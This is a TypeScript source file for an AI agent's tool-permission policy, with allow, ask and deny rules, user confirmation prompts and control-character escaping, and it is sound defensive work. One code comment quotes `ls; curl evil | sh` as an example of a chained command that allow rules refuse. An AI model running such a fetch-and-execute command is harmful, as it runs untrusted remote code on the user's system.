import { NexoError } from "@nexo/telemetry";

export type PolicyAction = "allow" | "ask" | "deny";

export interface PolicyRule {
	tool: string;
	match?: string;
	action: PolicyAction;
}

export interface ToolPolicyConfig {
	policy: Record<string, PolicyAction>;
	rules: PolicyRule[];
	nonInteractiveAsk: "allow" | "deny";
}

export interface Prompter {
	readonly interactive: boolean;
	confirm(question: string, signal?: AbortSignal): Promise<boolean>;
}

export const nonInteractivePrompter: Prompter = { interactive: false, confirm: async () => false };

export interface PolicyDecision {
	action: PolicyAction;
	rule?: number;
	subject: string;
}

export type Authorization = { allowed: true } | { allowed: false; error: NexoError };

export interface ToolPolicy {
	decide(toolName: string, args: unknown): PolicyDecision;
	/** `label` names the asking run (for example a subagent) in the prompt. */
	authorize(prompter: Prompter, toolName: string, args: unknown, signal?: AbortSignal, label?: string): Promise<Authorization>;
}

/** Shell metacharacters that chain or redirect commands; an allow rule never vouches for a command containing them. */
const SHELL_CHAINING = /[;&|`<>\n]|\$\(/;

/** Replaces control characters (newlines, ANSI escapes) so a subject cannot forge prompt text. */
function escapeControl(text: string): string {
	return text.replace(/[\u0000-\u001f\u007f]/g, (c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`);
}

const SUBJECT_KEY: Record<string, string> = { bash: "command", read: "path", write: "path", edit: "path", web_fetch: "url" };

function subjectOf(toolName: string, args: unknown): string {
	const key = SUBJECT_KEY[toolName];
	if (key && typeof args === "object" && args !== null && typeof (args as Record<string, unknown>)[key] === "string") {
		return (args as Record<string, string>)[key] as string;
	}
	return JSON.stringify(args ?? null);
}

/** True when `pattern` names `toolName`: exactly, or as a prefix when it ends in `*` (`mcp__playwright__*`). */
export function toolPatternMatches(pattern: string, toolName: string): boolean {
	return pattern.endsWith("*") ? toolName.startsWith(pattern.slice(0, -1)) : pattern === toolName;
}

/** The policy for `toolName`: its exact key, else the longest matching `*` key, else undefined. */
function policyFor(policy: Record<string, PolicyAction>, toolName: string): PolicyAction | undefined {
	if (Object.hasOwn(policy, toolName)) return policy[toolName];
	let best: string | undefined;
	for (const key of Object.keys(policy)) {
		if (key.endsWith("*") && toolPatternMatches(key, toolName) && (best === undefined || key.length > best.length)) best = key;
	}
	return best === undefined ? undefined : policy[best];
}

export function createPolicy(cfg: ToolPolicyConfig): ToolPolicy {
	const rules = cfg.rules.map((rule, index) => {
		try {
			return { ...rule, re: rule.match === undefined ? undefined : new RegExp(rule.match) };
		} catch (cause) {
			throw new NexoError({
				code: "CONFIG_INVALID",
				message: `tools.rules[${index}].match is not a valid regex: ${rule.match}`,
				context: { index },
				cause,
			});
		}
	});

	/**
	 * Rules are tested in order against the tool's subject. Deny rules are best-effort regex matches, not a sandbox.
	 * For bash, allow rules are ignored when the command chains or redirects, so `ls; curl evil | sh` is not allowed by `^ls`.
	 */
	const decide = (toolName: string, args: unknown): PolicyDecision => {
		const subject = subjectOf(toolName, args);
		for (let i = 0; i < rules.length; i++) {
			const rule = rules[i];
			if (!rule || !toolPatternMatches(rule.tool, toolName) || (rule.re && !rule.re.test(subject))) continue;
			if (rule.action === "allow" && toolName === "bash" && SHELL_CHAINING.test(subject)) continue;
			return { action: rule.action, rule: i, subject };
		}
		return { action: policyFor(cfg.policy, toolName) ?? "ask", subject };
	};

	return {
		decide,
		async authorize(prompter, toolName, args, signal, label) {
			const decision = decide(toolName, args);
			const ruleText = decision.rule === undefined ? "" : ` (rule #${decision.rule})`;
			if (decision.action === "allow") return { allowed: true };
			if (decision.action === "deny") {
				return {
					allowed: false,
					error: new NexoError({
						code: "TOOL_DENIED",
						message: `Tool "${toolName}" denied by policy${ruleText}: ${decision.subject}`,
						hint: "Change tools.policy or tools.rules in your nexo config",
						context: { toolName, rule: decision.rule },
					}),
				};
			}
			if (!prompter.interactive) {
				if (cfg.nonInteractiveAsk === "allow") return { allowed: true };
				return {
					allowed: false,
					error: new NexoError({
						code: "TOOL_DENIED",
						message: `Tool "${toolName}" requires approval but no interactive prompt is available: ${decision.subject}`,
						hint: 'Set tools.nonInteractiveAsk to "allow" or add an allow rule in tools.rules',
						context: { toolName },
					}),
				};
			}
			const prefix = label ? `[${escapeControl(label)}] ` : "";
			const ok = await prompter.confirm(`${prefix}Allow ${toolName}: ${escapeControl(decision.subject)}?`, signal);
			if (ok) return { allowed: true };
			return {
				allowed: false,
				error: new NexoError({ code: "TOOL_DENIED", message: `User declined ${toolName}: ${decision.subject}`, context: { toolName } }),
			};
		},
	};
}
